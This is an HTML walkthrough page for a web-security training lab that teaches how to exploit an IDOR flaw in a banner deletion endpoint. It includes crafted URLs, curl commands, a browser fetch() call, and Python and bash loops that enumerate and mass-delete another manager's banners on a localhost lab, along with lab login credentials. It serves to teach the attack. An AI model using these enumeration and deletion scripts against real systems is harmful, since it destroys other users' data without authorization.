<style>
    .doc-section h1 { font-size: 2.2rem; color: #ff4444; margin-bottom: 1rem; }
    .doc-section h2 { font-size: 1.5rem; color: #ff6666; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid rgba(255, 68, 68, 0.3); }
    .doc-section h3 { font-size: 1.2rem; color: #ff8888; margin: 1.5rem 0 0.75rem; }
    .doc-section p { color: #ccc; line-height: 1.8; margin-bottom: 1rem; }
    .doc-section ul, .doc-section ol { margin: 1rem 0 1rem 1.5rem; color: #ccc; }
    .doc-section li { margin-bottom: 0.5rem; line-height: 1.6; }
    .doc-section code { background: rgba(255, 68, 68, 0.15); padding: 0.2rem 0.5rem; border-radius: 4px; font-family: 'Consolas', monospace; font-size: 0.9rem; color: #ff8888; }
    .doc-section pre { background: #0d0d0d; border: 1px solid #333; border-radius: 10px; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
    .doc-section pre code { background: none; padding: 0; color: #88ff88; font-size: 0.85rem; }
    .warning-box { background: rgba(255, 200, 0, 0.1); border: 1px solid rgba(255, 200, 0, 0.4); border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; }
    .warning-box h4 { color: #ffcc00; margin-bottom: 0.5rem; }
    .danger-box { background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.4); border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; }
    .danger-box h4 { color: #ff6666; margin-bottom: 0.5rem; }
    .success-box { background: rgba(0, 200, 0, 0.1); border: 1px solid rgba(0, 200, 0, 0.4); border-radius: 10px; padding: 1.5rem; margin: 1.5rem 0; }
    .success-box h4 { color: #66ff66; margin-bottom: 0.5rem; }
    .step-card { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 68, 68, 0.3); border-radius: 15px; padding: 1.5rem; margin: 1.5rem 0; position: relative; }
    .step-number { position: absolute; top: -15px; left: 20px; background: #ff4444; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
    .step-title { color: #ff6666; margin-bottom: 0.75rem; font-size: 1.1rem; margin-left: 25px; }
</style>

<div class="doc-section">
    <h1>Exploitation Guide</h1>
    <p>
        This guide provides step-by-step instructions for exploiting the IDOR vulnerability in the 
        banner deletion endpoint. Follow along to understand how the attack works in practice.
    </p>

    <div class="warning-box">
        <h4>‚ö†Ô∏è Educational Purpose Only</h4>
        <p>
            This guide is for educational purposes in a controlled lab environment. Never attempt 
            to exploit vulnerabilities in systems you don't own or have explicit permission to test.
        </p>
    </div>

    <h2>Prerequisites</h2>
    <ul>
        <li>Lab database initialized via <code>setup_db.php</code></li>
        <li>Understanding of HTTP parameters and browser developer tools</li>
        <li>Knowledge of URL manipulation</li>
    </ul>

    <h2>Exploitation Steps</h2>

    <div class="step-card">
        <span class="step-number">1</span>
        <h3 class="step-title">Login as Attacker</h3>
        <p>Navigate to the login page and authenticate as Manager A (the attacker):</p>
        <pre><code>URL: /AC/lab14/login.php
Username: manager_a
Password: attacker123</code></pre>
        <p>After login, you'll be redirected to the dashboard showing your accessible clients and campaigns.</p>
    </div>

    <div class="step-card">
        <span class="step-number">2</span>
        <h3 class="step-title">Navigate to Your Campaign Banners</h3>
        <p>From the dashboard, click on one of your campaigns to view banners:</p>
        <ul>
            <li>Click "View Banners" on Campaign 1 (Summer Sale 2024)</li>
            <li>Note the URL structure: <code>campaign-banners.php?clientid=1&campaignid=1</code></li>
        </ul>
        <p>You should see your banners (IDs 1-3) with delete links.</p>
    </div>

    <div class="step-card">
        <span class="step-number">3</span>
        <h3 class="step-title">Extract Delete URL Structure</h3>
        <p>Hover over or right-click a delete link to examine the URL structure:</p>
        <pre><code>banner-delete.php?token=YOUR_CSRF_TOKEN&clientid=1&campaignid=1&bannerid=1</code></pre>
        <p>Note the parameters:</p>
        <ul>
            <li><code>token</code> - Your CSRF token (displayed on the page)</li>
            <li><code>clientid</code> - The client ID (you have access to clients 1-2)</li>
            <li><code>campaignid</code> - The campaign ID (must belong to the client)</li>
            <li><code>bannerid</code> - The target banner ID (THIS is what we'll manipulate!)</li>
        </ul>
    </div>

    <div class="step-card">
        <span class="step-number">4</span>
        <h3 class="step-title">Identify Victim's Banner IDs</h3>
        <p>Manager B (victim) owns banners with IDs 6-11. In a real attack scenario, you might discover these through:</p>
        <ul>
            <li>Sequential ID enumeration (trying IDs 5, 6, 7...)</li>
            <li>Information disclosure in error messages</li>
            <li>API responses that leak object IDs</li>
            <li>Cached pages or client-side JavaScript</li>
        </ul>
        <p>For this lab, the hint on campaign-banners.php reveals that victim banners are IDs 6-11.</p>
    </div>

    <div class="step-card">
        <span class="step-number">5</span>
        <h3 class="step-title">Craft Malicious URL</h3>
        <p>Create a URL that uses YOUR valid client/campaign IDs but the VICTIM's banner ID:</p>
        <pre><code># Original delete link (for your banner):
banner-delete.php?token=YOUR_TOKEN&clientid=1&campaignid=1&bannerid=1

# Malicious delete link (for victim's banner):
banner-delete.php?token=YOUR_TOKEN&clientid=1&campaignid=1&bannerid=6</code></pre>
        
        <div class="danger-box">
            <h4>üîì The IDOR Exploit</h4>
            <p>
                By keeping <code>clientid=1</code> and <code>campaignid=1</code> (which you legitimately own), 
                you bypass the authorization checks. The server never validates that <code>bannerid=6</code> 
                actually belongs to campaign 1!
            </p>
        </div>
    </div>

    <div class="step-card">
        <span class="step-number">6</span>
        <h3 class="step-title">Execute the Attack</h3>
        <p>Visit the crafted URL in your browser or use a tool like curl:</p>
        <pre><code># Browser method:
Copy the malicious URL into browser address bar and press Enter

# cURL method:
curl -b "PHPSESSID=your_session" \
  "http://localhost/AC/lab14/banner-delete.php?\
token=YOUR_CSRF_TOKEN&clientid=1&campaignid=1&bannerid=6"</code></pre>
    </div>

    <div class="step-card">
        <span class="step-number">7</span>
        <h3 class="step-title">Verify Success</h3>
        <p>If the exploit succeeds:</p>
        <ul>
            <li>You'll be redirected to <code>success.php</code> with a congratulations message</li>
            <li>Lab 14 will be marked as solved in your progress tracker</li>
            <li>Banner ID 6 belonging to Manager B has been deleted!</li>
        </ul>
    </div>

    <h2>Alternative Exploitation Methods</h2>

    <h3>Using Browser Developer Tools</h3>
    <pre><code>// Open console (F12) and execute:
fetch('/AC/lab14/banner-delete.php?' + new URLSearchParams({
    token: 'YOUR_CSRF_TOKEN',
    clientid: '1',
    campaignid: '1',
    bannerid: '6'
}))
.then(response => response.text())
.then(html => console.log('Banner deleted!'));</code></pre>

    <h3>Using Burp Suite</h3>
    <ol>
        <li>Capture a legitimate banner delete request</li>
        <li>Send to Repeater</li>
        <li>Modify <code>bannerid</code> parameter to 6, 7, 8, etc.</li>
        <li>Forward the modified request</li>
    </ol>

    <h3>Automated Enumeration</h3>
    <pre><code># Python script to enumerate and delete all banners
import requests

session = requests.Session()
base_url = "http://localhost/AC/lab14"
csrf_token = "YOUR_TOKEN"

# Try banner IDs 1-20
for banner_id in range(1, 21):
    url = f"{base_url}/banner-delete.php"
    params = {
        "token": csrf_token,
        "clientid": 1,
        "campaignid": 1,
        "bannerid": banner_id
    }
    response = session.get(url, params=params)
    print(f"Banner {banner_id}: {response.status_code}")</code></pre>

    <h2>Attack Variations</h2>

    <h3>Mass Deletion Attack</h3>
    <p>Delete all of Manager B's banners (IDs 6-11) in sequence:</p>
    <pre><code>for i in {6..11}; do
    curl -s "http://localhost/AC/lab14/banner-delete.php?\
token=TOKEN&clientid=1&campaignid=1&bannerid=$i"
done</code></pre>

    <h3>Cross-Manager Attack</h3>
    <p>Manager C's banners (12-13) can also be targeted:</p>
    <pre><code>banner-delete.php?token=TOKEN&clientid=1&campaignid=1&bannerid=12
banner-delete.php?token=TOKEN&clientid=1&campaignid=1&bannerid=13</code></pre>

    <div class="success-box">
        <h4>‚úÖ Exploitation Complete!</h4>
        <p>
            You've successfully exploited the IDOR vulnerability to delete another manager's banner. 
            This demonstrates how missing object-level authorization checks can lead to unauthorized 
            data manipulation across user boundaries.
        </p>
    </div>
</div>
